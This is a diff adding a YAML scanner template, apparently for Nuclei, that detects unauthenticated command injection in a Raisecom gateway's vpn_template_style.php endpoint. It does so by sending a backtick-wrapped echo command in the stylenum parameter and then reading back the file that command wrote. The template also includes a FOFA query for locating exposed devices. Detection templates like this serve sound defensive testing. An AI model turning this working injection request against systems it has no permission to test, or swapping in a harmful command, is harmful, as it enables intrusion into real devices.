@@ -1,0 +1,56 @@
+id: raisecom-rce
+
+info:
+  name: Raisecom Gateway vpn_template_style.php - Remote Command Execution
+  author: 3th1c_yuk1
+  severity: critical
+  description: |
+    The /vpn/vpn_template_style.php endpoint in Raisecom Multi-Service Intelligent Gateway is vulnerable to unauthenticated remote command execution. The stylenum parameter fails to properly sanitize user input, allowing attackers to inject system commands using backticks (`\) or pipe (|`) characters.
+  impact: |
+    Successful exploitation allows arbitrary command execution on the target device, enabling actions such as file manipulation or system control. This vulnerability affects multiple instances and does not require authentication.
+  reference:
+    - https://github.com/koishi0x01/CVE/blob/main/CVE_1.md
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: '"<TITLE>Web user login</TITLE>" && "<META content\==MSHTML 6.00.2900.5583\" name\=GENERATOR></HEAD>"'
+  tags: raisecom,rce,intrusive
+
+variables:
+  string: "{{randstr}}"
+  filename: "{{to_lower(rand_text_alpha(5))}}"
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+          - 'contains(body, "Web user login")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        GET /vpn/vpn_template_style.php?mySubmit=true&stylenum=%60echo+-e+%27{{string}}%27%3E/www/tmp/{{filename}}.txt%60 HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /tmp/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && status_code_2 == 200"
+          - 'contains(content_type_2, "text/plain")'
+          - "contains(body_2, '{{string}}')"
+        condition: and
+# digest: 4a0a00473045022011a216917cd6c9fc1e344220960af1480f933667e037fea112031accc2ee17530221009a60cfba8840442f2e15149325455a415b2b83f7ce075c10dc68276f06476b6f:922c64590222798bb761d5b6d8e72950
